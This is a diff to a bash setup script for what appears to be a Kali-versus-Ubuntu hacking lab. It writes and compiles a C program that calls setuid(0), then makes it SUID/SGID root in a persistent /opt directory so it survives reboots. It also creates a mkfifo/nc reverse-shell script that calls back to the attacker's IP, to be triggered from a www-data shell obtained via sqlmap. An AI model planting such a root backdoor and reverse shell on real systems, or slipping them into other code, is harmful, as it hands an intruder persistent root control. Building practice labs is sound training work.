@@ -65,21 +65,29 @@ trap handle_interrupt INT
 ### === UBUNTU VM FUNCTIONS (TARGET) === ###
 
 ubuntu_setup_suid_escalation() {
-    print_title "Setting Up SUID Privilege Escalation Binaries on Ubuntu VM"
+    print_title "Setting Up PERSISTENT SUID Privilege Escalation Binaries"
 
-    # --- Step 1: Get Attacker IP for the Reverse Shell ---
+    # --- Step 1: Define a Persistent, Secure Path ---
+    local EXPLOIT_DIR="/opt/escalation_tools"
+    print_info "Using persistent directory for exploit files: ${EXPLOIT_DIR}"
+    mkdir -p "$EXPLOIT_DIR"
+
+    # --- Step 2: Get Attacker IP for the Reverse Shell ---
     local KALI_HOST_IP
-    echo -ne "${CYAN}Enter your Kali VM's IP address (e.g., 192.168.56.1 for the reverse shell to connect to, 15s timeout): ${RESET}"
-    if ! read -t 15 KALI_HOST_IP < /dev/tty || [ -z "$KALI_HOST_IP" ]; then
+    echo -ne "\e[96mEnter your Kali VM's IP address (for the reverse shell): \e[0m"
+    read -p "" KALI_HOST_IP
+    if [ -z "$KALI_HOST_IP" ]; then
         print_error "Kali IP address cannot be empty. Aborting."
         exit 1
     fi
     print_info "Reverse shell will connect back to: ${KALI_HOST_IP}"
     echo ""
 
-    # --- Step 2: Create the C Program for Escalation ---
-    print_info "Creating C source file at /tmp/escalate.c..."
-    tee /tmp/escalate.c > /dev/null <<EOF
+    # --- Step 3: Create the C Program for Escalation ---
+    local C_SOURCE_FILE="${EXPLOIT_DIR}/escalate.c"
+    local C_BINARY_FILE="${EXPLOIT_DIR}/escalate"
+    print_info "Creating C source file at ${C_SOURCE_FILE}..."
+    tee "$C_SOURCE_FILE" > /dev/null <<EOF
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/types.h>
@@ -88,49 +96,49 @@ ubuntu_setup_suid_escalation() {
 int main(void) {
     setuid(0);
     setgid(0);
-    system("/bin/bash /tmp/im_root.sh");
+    system("/bin/bash ${EXPLOIT_DIR}/im_root.sh");
     return 0;
 }
 EOF
     print_success "C source file created."
 
-    # --- Step 3: Compile the Program ---
-    print_info "Compiling /tmp/escalate.c into /tmp/escalate..."
+    # --- Step 4: Compile the Program ---
+    print_info "Compiling ${C_SOURCE_FILE} into ${C_BINARY_FILE}..."
     if ! command -v gcc &> /dev/null; then
         print_warn "gcc not found. Installing 'build-essential' package..."
         apt-get update && apt-get install -y build-essential
     fi
-    if gcc -o /tmp/escalate /tmp/escalate.c; then
+    if gcc -o "$C_BINARY_FILE" "$C_SOURCE_FILE"; then
         print_success "Compilation successful."
     else
         print_error "Compilation failed. Please check for errors."
         exit 1
     fi
 
-    # --- Step 4: Set Ownership and SUID Permissions ---
+    # --- Step 5: Set Ownership and SUID Permissions ---
     print_info "Setting ownership and permissions on the 'escalate' binary..."
-    # The tutorial mentions `users` group, which is standard.
-    chown root:users /tmp/escalate
-    chmod u+x /tmp/escalate
-    # Set SUID (s) for user and group
-    chmod ug+s /tmp/escalate
+    chown root:users "$C_BINARY_FILE"
+    chmod u+x "$C_BINARY_FILE"
+    chmod ug+s "$C_BINARY_FILE" # Set SUID and SGID
     print_success "Ownership set to 'root:users' and SUID bit set."
-    ls -l /tmp/escalate # Show the result for verification
+    ls -l "$C_BINARY_FILE" # Show the result for verification
 
-    # --- Step 5: Create the Reverse Shell Script ---
-    print_info "Creating reverse shell script at /tmp/im_root.sh..."
-    tee /tmp/im_root.sh > /dev/null <<EOF
+    # --- Step 6: Create the Reverse Shell Script ---
+    local REVERSE_SHELL_SCRIPT="${EXPLOIT_DIR}/im_root.sh"
+    print_info "Creating reverse shell script at ${REVERSE_SHELL_SCRIPT}..."
+    tee "$REVERSE_SHELL_SCRIPT" > /dev/null <<EOF
 #!/bin/bash
 # This script creates a reverse shell back to the attacker (Kali VM).
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/bash -i 2>&1 | nc ${KALI_HOST_IP} 1234 > /tmp/f
 EOF
-    chmod +x /tmp/im_root.sh
+    chmod +x "$REVERSE_SHELL_SCRIPT"
     print_success "Reverse shell script created and made executable."
     
-    print_title "SUID Escalation Setup Complete"
-    print_info "The next step is to get a 'www-data' shell via sqlmap and then trigger the exploit."
-    print_info "You can run this script with the 'kali_trigger_exploit' argument for instructions."
+    print_title "Persistent SUID Escalation Setup Complete"
+    print_info "The exploit files are now located in ${EXPLOIT_DIR} and will survive a reboot."
+    print_info "When you get your www-data shell, run the following command to trigger the exploit:"
+    echo -e "${GREEN}${EXPLOIT_DIR}/escalate${RESET}"
 }
 
 ubuntu_run_peas_scan() {
